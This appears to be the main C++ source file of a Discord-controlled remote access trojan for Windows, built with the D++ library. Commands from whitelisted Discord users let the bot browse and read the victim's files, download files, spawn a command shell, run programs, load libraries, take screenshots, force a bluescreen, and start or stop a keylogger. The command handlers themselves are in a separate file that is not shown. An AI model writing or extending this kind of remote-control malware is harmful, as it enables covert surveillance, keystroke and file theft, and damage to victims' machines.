#include <dpp/dpp.h>


#include <vector>
#include "filesystem.h"
#include "tasks.h"
#include <string>
#include <Windows.h>
using namespace dpp;

std::string BOT_TOKEN = "";
std::vector<std::string> whitelist{ "kalix_z#0000" };
bool useWaitlist = true;

std::vector<std::string> split(std::string s, std::string delimiter);
void send_message(cluster& bot, std::string txt, const snowflake& channel_id);
std::string get_bot_token(const std::string& secret_file);






int main()
{
    BOT_TOKEN = get_bot_token("token.tok");

    if (BOT_TOKEN.size() == 0) return -1;

    init_fsys();
    /* Create bot cluster */
    cluster bot = cluster(BOT_TOKEN, i_all_intents);


    /* Output simple log messages to stdout */
    bot.on_log(utility::cout_logger());

    /* event for every message recieved */
    bot.on_message_create([&](const message_create_t& evnt) {

        // if the author isnt on the whitelist return
        /* if msg starts with ! */
        if (evnt.msg.content[0] != '$')
            return;
        
        std::string command = evnt.msg.content;
        // get the command by removing first char, the !
        command.erase(0, 1);
        std::vector<std::string> args = split(command, " ");
        if (std::find(std::begin(whitelist), std::end(whitelist), evnt.msg.author.format_username()) == std::end(whitelist))
            send_message(bot, "You do not have access to this!", evnt.msg.channel_id);
        else if (args[0] == "cd") {
            send_message(bot, command_cd(args), evnt.msg.channel_id);
        }
        else if (args[0] == "pwd") {
            send_message(bot, command_pwd(args), evnt.msg.channel_id);
        }
        else if (args[0] == "ls") {
            send_message(bot, command_ls(args), evnt.msg.channel_id);
        }
        else if (args[0] == "readfile") {
            send_message(bot, command_readfile(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "openfile") {
            send_message(bot, command_openfile(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "popup") {
            send_message(bot, command_popup(args), evnt.msg.channel_id);
        }
        else if (args[0] == "cmdspawn") {
            send_message(bot, command_cmdspawn(args), evnt.msg.channel_id);
        }
        else if (args[0] == "appclose") {
            send_message(bot, command_applicationclose(args), evnt.msg.channel_id);
        }
        else if (args[0] == "applist") {
            send_message(bot, command_applicationlist(args), evnt.msg.channel_id);
        }
        else if (args[0] == "runprogram") {
            send_message(bot, command_runprogram(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "loadlibrary") {
            send_message(bot, command_loadlibrary(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "changebackround") {
            send_message(bot, command_changebackround(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "downloadfile") {
            send_message(bot, command_downloadfile(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "screenshot") {
            send_message(bot, command_screenshot(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "bluescreen") {
            send_message(bot, command_bluescreen(args), evnt.msg.channel_id);
        }
        else if (args[0] == "keylog_start") {
            send_message(bot, command_keyloggerstart(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "keylog_stop") {
            send_message(bot, command_keyloggerstop(args, evnt), evnt.msg.channel_id);
        }
        else if (args[0] == "help") {
            send_message(bot, command_help(args), evnt.msg.channel_id);
        }
        else {
            // check if the command given is a custom command, otherwise
            std::string msg = command_custom(args, evnt);
            if (msg != "")
                send_message(bot, msg, evnt.msg.channel_id);
            else
                send_message(bot, "Unkown Command, Try !Help a List of Commands", evnt.msg.channel_id);
        }
        
    });

    /* Register slash command here in on_ready */
    bot.on_ready([&bot](const ready_t& event) {
        bot.log(ll_debug, "Bot Loaded");
    });

    /* Start the bot */
    try {
        bot.start(false);
    }
    catch (dpp::invalid_token_exception) {
        bot.log(ll_error, "ERROR, invalid token");
    }
    return 0;
}

void initialize_whitelist(std::vector<std::string>* whilelist) {

}

std::vector<std::string> split(std::string s, std::string delimiter) {
    size_t pos_start = 0, pos_end, delim_len = delimiter.length();
    std::string token;
    std::vector<std::string> res;

    while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos) {
        token = s.substr(pos_start, pos_end - pos_start);
        pos_start = pos_end + delim_len;
        res.push_back(token);
    }

    res.push_back(s.substr(pos_start));
    return res;
}



void send_message(cluster& bot, std::string txt, const snowflake& channel_id) {

    /* if the message is over 2k chars, cut it off at 2k */
    if (txt.size() > 2000)
        txt.erase(2000, std::string::npos);

    message msg;
    msg.content = txt;
    msg.channel_id = channel_id;
    bot.message_create(msg);
}

std::string get_bot_token(const std::string& secret_file) {
    FILE* token_file = fopen(secret_file.c_str(), "r");
    if (!token_file) {
        std::cerr << "Error: Invalid secret token file\n";
        return "";
    }
    fseek(token_file, 0, SEEK_END);
    size_t len = ftell(token_file);
    fseek(token_file, 0, SEEK_SET);
    constexpr int MAX_TOKEN_LEN = 257;
    /* if the file is longer than 256 chars, there is no token in the file(it should be much shorter than 256) */
    if (len > MAX_TOKEN_LEN - 1) {
        std::cerr << "Error in secret token file\n";
        return "";
    }

    char token_c_str[MAX_TOKEN_LEN];
    fread(token_c_str, sizeof(char), len, token_file);

    /* terminate the c_string */
    token_c_str[len] = '\0';

    return token_c_str;
}
